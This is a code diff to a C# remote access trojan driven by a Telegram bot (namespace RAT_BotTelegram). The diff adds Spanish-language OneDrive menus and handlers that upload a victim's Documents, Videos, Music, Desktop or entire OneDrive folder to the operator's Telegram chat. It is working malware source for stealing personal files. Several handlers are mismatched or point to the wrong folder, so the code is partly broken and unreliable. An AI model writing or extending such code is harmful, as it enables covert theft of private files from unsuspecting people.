@@ -107,13 +107,41 @@ namespace RAT_BotTelegram {
                             callbackData: "GetMusicO"),
                     },new[]{
                         InlineKeyboardButton.WithCallbackData(
+                            text:"|OneDrive| Get Desktop",
+                            callbackData: "getDesktopO"),
+                        InlineKeyboardButton.WithCallbackData(
+                            text:"Get all files from OneDrive",
+                            callbackData: "getAllO")
+                    }});
+                    var GetFilesOneDriveE = new InlineKeyboardMarkup(new[]{
+                    new[]{
+                        InlineKeyboardButton.WithCallbackData(
+                            text: "|OneDrive| Get Pictures",
+                            callbackData: "GetPicturesOE"),
+                        InlineKeyboardButton.WithCallbackData(
+                            text: "|OneDrive| Get Videos",
+                            callbackData: "GetVideosOE"),
+
+                    },new[]{
+                        InlineKeyboardButton.WithCallbackData(
+                            text:"|OneDrive| Get Documents",
+                            callbackData: "GetDocumentOE"),
+                        InlineKeyboardButton.WithCallbackData(
+                            text:"|OneDrive| Get Music",
+                            callbackData: "GetMusicOE"),
+                    },new[]{
+                        InlineKeyboardButton.WithCallbackData(
+                            text:"|OneDrive| Get Desktop",
+                            callbackData: "getDesktopOE"),
+                        InlineKeyboardButton.WithCallbackData(
                             text:"Get all files from OneDrive",
                             callbackData: "getAllO")
                     }});
 
                     await Bot.SendTextMessageAsync(config.id, " NOTE: Absolutely all files will be obtained.");
                     await Bot.SendTextMessageAsync(config.id, "User Files: "+ Features.getUserName(), replyMarkup: GetFiles);        // Obtiene USER
-                    await Bot.SendTextMessageAsync(config.id, "OneDrive Files: ", replyMarkup: GetFilesOneDrive); // Obtiene USER Onedrive
+                    await Bot.SendTextMessageAsync(config.id, "OneDrive Files: |English| ", replyMarkup: GetFilesOneDrive); // Obtiene USER Onedrive
+                    await Bot.SendTextMessageAsync(config.id, "OneDrive Files: |Español|", replyMarkup: GetFilesOneDriveE); // Obtiene USER Onedrive
                     // await Bot.SendTextMessageAsync(config.id, "NOTE: The process of obtaining files can take many minutes per file. \n[Depends on the upload speed of the computer]");
 
                     break;
@@ -345,22 +373,25 @@ namespace RAT_BotTelegram {
                     GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\Desktop");
                     break;
 
-                // OneDrive
+                // OneDrive Español
 
-                case "GetPicturesO":
+                case "GetPicturesOE":
+                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\OneDrive\Documentos");
+                    break;
+                case "GetVideosOE":
+                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\OneDrive\Videos");
+                    break;
+                case "GetDocumentOE":
                     GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\OneDrive\Documents");
                     break;
-                case "GetVideosO":
-                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\OneDrive\Documents");
+                case "GetMusicOE":
+                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\OneDrive\Musica");
                     break;
-                case "GetDocumentO":
-                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\OneDrive\Documents");
-                    break;
-                case "GetMusicO":
-                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\OneDrive\Documents");
+                case "GetDesktopOE":
+                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\OneDrive\Escritorio");
                     break;
                 case "GetgetAllO":
-                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\OneDrive\Documents");
+                    GetFilesTelegram(@"C:\Users\" + Features.getUserName() + @"\OneDrive");
                     break;
                // Other
 
